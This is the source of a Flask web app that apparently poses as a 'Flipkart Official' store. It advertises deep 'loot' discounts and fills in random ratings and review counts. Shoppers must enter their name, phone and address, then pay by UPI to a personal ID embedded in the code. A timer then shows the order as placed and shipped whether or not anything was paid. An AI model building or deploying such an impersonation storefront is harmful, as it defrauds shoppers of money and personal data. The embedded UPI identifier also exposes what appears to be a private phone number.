from flask import Flask, render_template_string, request, session, redirect, url_for
import random
import datetime
import os

app = Flask(__name__)
app.secret_key = 'flipkart_user_account_system_v1'

# ==========================================
# 1. SETTINGS & LOGIC
# ==========================================
MY_UPI_ID = "9653314458@naviaxis"
MY_NAME = "Apni Dukaan"
START_DATE = datetime.date(2025, 1, 1) 

products = []
next_id = 1

# ==========================================
# 2. PRODUCTS SETUP (Purana Data Barqarar)
# ==========================================
def add_item(name, price, mrp, cat, imgs, specs, desc, is_new=False):
    global next_id
    products.append({
        'id': next_id, 'name': name, 'price': price, 'mrp': mrp,
        'discount': int(((mrp - price) / mrp) * 100),
        'category': cat, 'images': imgs, 'specs': specs,
        'desc': desc, 'rating': round(random.uniform(4.0, 4.9), 1),
        'reviews': f"{random.randint(1000, 50000)}", 'is_new': is_new
    })
    next_id += 1

def setup_store():
    # Loot Items
    add_item("Plastic Cricket Bat", 99, 999, "Loot", ["https://rukminim2.flixcart.com/image/416/416/xif0q/bat/q/t/y/1-plastic-cricket-bat-for-kids-plastic-cricket-bat-full-size-original-imagpyz5a5z5z5ze.jpeg"], {"Material":"PVC"}, "Gully cricket bat.")
    add_item("Matte Red Lipstick", 29, 399, "Loot", ["https://m.media-amazon.com/images/I/51+Y+Z+0+1L._SX679_.jpg"], {"Shade":"Ruby Red"}, "Long stay.")
    
    # Mobiles
    add_item("Samsung Galaxy S24 Ultra", 129999, 159999, "Mobile", ["https://m.media-amazon.com/images/I/81vxWpPpgNL._SX679_.jpg"], {"RAM":"12GB", "ROM":"256GB"}, "AI Flagship.")
    add_item("iPhone 15 Pro Max", 148900, 159900, "Mobile", ["https://m.media-amazon.com/images/I/81vxWpPpgNL._SX679_.jpg"], {"Chip":"A17 Pro"}, "Titanium build.")

    # Daily Auto-Add Logic
    days_passed = (datetime.date.today() - START_DATE).days
    for i in range(min(days_passed * 5, 30)):
        add_item("Daily New Arrival", 499, 1499, "Fashion", ["https://m.media-amazon.com/images/I/71abcde.jpg"], {"Type":"New"}, "Fresh stock.", is_new=True)

setup_store()

# ==========================================
# 3. HTML TEMPLATE (With Login/Signup Screen)
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart Official</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --fk-blue: #2874f0; --fk-yellow: #ff9f00; --bg: #f1f2f4; }
        body { background: var(--bg); padding-bottom: 70px; font-family: sans-serif; }
        .navbar { background: var(--fk-blue); padding: 10px; position: sticky; top: 0; z-index: 1000; }
        .btn-buy { background: var(--fk-yellow); color: white; padding: 15px; font-weight: bold; border: none; width: 100%; text-align: center; display: block; }
        .card { background: white; border: 1px solid #ddd; border-radius: 4px; overflow: hidden; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; padding: 6px; }
        .tag-new { position: absolute; top: 0; right: 0; background: red; color: white; font-size: 10px; padding: 2px 5px; }
        .loot-banner { background: linear-gradient(90deg, #ff0000, #ff9f00); color: white; padding: 15px; text-align: center; font-weight: bold; margin: 10px; border-radius: 4px; }
    </style>
</head>
<body>

    {% if page == 'register' %}
    <div class="container-fluid bg-white" style="min-height: 100vh; padding-top: 50px;">
        <div class="text-center mb-4">
            <h2 style="color: var(--fk-blue); font-weight: bold; font-style: italic;">Flipkart</h2>
            <p class="text-muted">Create your account to start shopping</p>
        </div>
        <div class="p-3 shadow-sm rounded border">
            <form action="/setup_account" method="POST">
                <label class="small fw-bold">Full Name</label>
                <input name="name" class="form-control mb-3" placeholder="Enter your name" required>
                
                <label class="small fw-bold">Mobile Number</label>
                <div class="input-group mb-3">
                    <span class="input-group-text">+91</span>
                    <input name="phone" type="number" class="form-control" placeholder="10-digit number" required>
                </div>

                <label class="small fw-bold">Delivery Address</label>
                <textarea name="address" class="form-control mb-3" rows="3" placeholder="House No, Street, Pincode..." required></textarea>
                
                <button type="submit" class="btn btn-primary w-100 fw-bold py-2" style="background: var(--fk-yellow); border: none;">CREATE ACCOUNT</button>
            </form>
        </div>
    </div>

    {% else %}
    <nav class="navbar d-flex flex-column align-items-start">
        <div class="d-flex w-100 justify-content-between align-items-center mb-2">
            <div class="text-white fw-bold italic fs-5">Flipkart</div>
            <div class="text-white small"><i class="fas fa-user-circle"></i> Hi, {{ session.user.name }}</div>
        </div>
        <form action="/" class="w-100"><input name="q" class="form-control" placeholder="Search brands, products..."></form>
    </nav>

    {% if page == 'home' %}
        <a href="/?cat=Loot"><div class="loot-banner">🚀 CLICK HERE: ₹5, ₹99, ₹999 LOOT DEALS LIVE! 🚀</div></a>
        <div class="grid">
            {% for p in items %}
            <a href="/product/{{ p.id }}" class="card text-dark text-decoration-none position-relative">
                {% if p.is_new %}<span class="tag-new">NEW</span>{% endif %}
                <img src="{{ p.images[0] }}" style="height: 150px; object-fit: contain; padding: 10px;">
                <div class="p-2">
                    <div class="small text-truncate">{{ p.name }}</div>
                    <div class="fw-bold">₹{{ p.price }} <span class="text-muted text-decoration-line-through small">₹{{ p.mrp }}</span></div>
                </div>
            </a>
            {% endfor %}
        </div>

    {% elif page == 'detail' %}
        <div class="bg-white p-3 text-center">
            <img src="{{ p.images[0] }}" style="max-height: 300px; max-width: 100%;">
        </div>
        <div class="p-3 bg-white mt-2">
            <h5>{{ p.name }}</h5>
            <div class="badge bg-success mb-2">{{ p.rating }} ★</div>
            <h1 class="fw-bold">₹{{ p.price }} <span class="text-muted fs-5 text-decoration-line-through">₹{{ p.mrp }}</span></h1>
            <hr>
            <div class="small text-muted mb-3"><i class="fas fa-map-marker-alt text-primary"></i> Delivering to: <b>{{ session.user.address }}</b></div>
            <a href="/buy_now/{{ p.id }}" class="btn-buy">BUY NOW</a>
        </div>

    {% elif page == 'payment' %}
        <div class="p-4 bg-white m-3 text-center shadow-sm">
            <h5>Payable: ₹{{ session.buy_price }}</h5>
            <div class="alert alert-info mt-3 small">Delivery to: {{ session.user.name }}<br>{{ session.user.address }}</div>
            <a href="upi://pay?pa={{ upi_id }}&pn={{ upi_name }}&am={{ session.buy_price }}&cu=INR" class="btn btn-success w-100 py-3 fw-bold" onclick="ok()">PAY VIA UPI</a>
            <form id="f" action="/success" method="POST"></form>
        </div>
        <script>function ok(){setTimeout(()=>document.getElementById('f').submit(),5000);}</script>

    {% elif page == 'success' %}
        <div class="text-center mt-5 p-5"><i class="fas fa-check-circle text-success" style="font-size:80px;"></i><h2 class="mt-4">Order Placed!</h2><a href="/" class="btn btn-primary mt-4">Shop More</a></div>

    {% elif page == 'my_orders' %}
        <div class="p-3"><h5>My Orders</h5>
            {% for o in orders %}<div class="card mb-3 p-3 shadow-sm border-0"><div class="d-flex gap-3"><img src="{{ o.image }}" style="width:60px;"><div><div class="fw-bold small">{{ o.item }}</div><div class="text-muted">₹{{ o.amount }}</div></div></div><div class="bg-light p-2 mt-2 rounded small text-success fw-bold">Arriving in 7 Days • {{ o.status }}</div></div>{% else %}<div class="text-center mt-5">No orders found.</div>{% endfor %}
        </div>
    {% endif %}

    <div class="fixed-bottom bg-white d-flex border-top py-2" style="z-index: 1000;">
        <a href="/" class="flex-grow-1 text-center small text-dark"><i class="fas fa-home d-block"></i>Home</a>
        <a href="/my_orders" class="flex-grow-1 text-center small text-dark"><i class="fas fa-box d-block"></i>Orders</a>
        <a href="/logout" class="flex-grow-1 text-center small text-danger"><i class="fas fa-sign-out-alt d-block"></i>Logout</a>
    </div>
    {% endif %}

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""

# ==========================================
# 4. ROUTES (Naya Logic Yahan Hai)
# ==========================================

# Har request se pehle check karo ki account setup hai ya nahi
@app.before_request
def check_user():
    allowed_routes = ['setup_account', 'static']
    if 'user' not in session and request.endpoint not in allowed_routes:
        # Agar user ka account setup nahi hai, to registration page dikhao
        return render_template_string(HTML_TEMPLATE, page='register')

@app.route('/setup_account', methods=['POST'])
def setup_account():
    # User ka data session mein save karo
    session['user'] = {
        'name': request.form.get('name'),
        'phone': request.form.get('phone'),
        'address': request.form.get('address')
    }
    return redirect(url_for('home'))

@app.route('/')
def home():
    q = request.args.get('q', '').lower()
    cat = request.args.get('cat', 'all')
    items = products
    if q: items = [i for i in products if q in i['name'].lower()]
    elif cat != 'all': items = [i for i in products if i['category'] == cat]
    return render_template_string(HTML_TEMPLATE, page='home', items=items)

@app.route('/product/<int:pid>')
def detail(pid):
    p = next((i for i in products if i['id'] == pid), None)
    return render_template_string(HTML_TEMPLATE, page='detail', p=p)

@app.route('/buy_now/<int:pid>')
def buy_now(pid):
    p = next((i for i in products if i['id'] == pid), None)
    session['buy_price'], session['buy_item'], session['buy_img'] = p['price'], p['name'], p['images'][0]
    return redirect(url_for('payment')) # Seedha payment par, kyunki address pehle hi le liya hai

@app.route('/payment')
def payment():
    return render_template_string(HTML_TEMPLATE, page='payment', upi_id=MY_UPI_ID, upi_name=MY_NAME)

@app.route('/success', methods=['POST'])
def success():
    orders = session.get('orders', [])
    orders.insert(0, {'item': session.get('buy_item'), 'amount': session.get('buy_price'), 'image': session.get('buy_img'), 'status': 'Shipped'})
    session['orders'] = orders
    return render_template_string(HTML_TEMPLATE, page='success')

@app.route('/my_orders')
def my_orders():
    return render_template_string(HTML_TEMPLATE, page='my_orders', orders=session.get('orders', []))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
